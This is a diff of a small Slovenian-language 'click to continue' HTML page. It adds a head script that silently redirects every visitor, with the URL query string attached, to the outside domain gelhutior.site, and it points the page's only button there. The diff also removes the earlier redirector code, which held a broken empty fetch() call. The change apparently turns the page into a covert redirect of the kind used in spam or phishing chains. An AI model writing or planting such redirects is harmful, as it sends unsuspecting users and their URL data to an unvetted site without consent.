@@ -1,6 +1,15 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+<script type="text/javascript">
+var utm = location.search;
+var url = new URL('https://gelhutior.site/');
+url.search = utm;
+
+location.replace(url);
+
+
+</script>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -76,58 +85,9 @@
 <body style="overflow:hidden">
     <div class="flex">
         <div class="container">
-            <img src="like.svg" class="like" alt="Like icon">
-            <p class="copy">
-                V redu je!
-            </p>
-            <p class="alt">
-                Kliknite tukaj, da nadaljujete.
-            </p>
-            <a href="#" class="custom-url" id="redirect">NADALJUJ >></a>
+
+            <a href="https://gelhutior.site/" class="custom-url" id="redirect">NADALJUJ >></a>
         </div>
     </div>
 </body>
 </html>
-
-<script type="text/javascript">
-var query = location.search.slice(1);
-var partes = query.split('&ff');
-var data = {};
-partes.forEach(function (parte) {
-    var chaveValor = parte.split('kk');
-    var chave = chaveValor[0];
-    var valor = chaveValor[1];
-    data[chave] = valor;
-});
-
-var encurtar = data['encurtar'];
-var url = data['url'];
-if(encurtar === 'sim'){
-
-
-
-
-fetch()
-  .then(response => {
-    return response.json()
-  })
-  .then(resultado => {
-    // Work with JSON data here
-	var link = resultado['short'];
-        $(document).ready(function () {
-        $('.custom-url').attr('href', link);
-});
-  })
-  .catch(err => {
-    // Do something for an error here
-  })
-
-}else{
-
-     $(document).ready(function () {
-        $('.custom-url').attr('href', decodeURIComponent(url));
-});
-
-}
-
-</script>
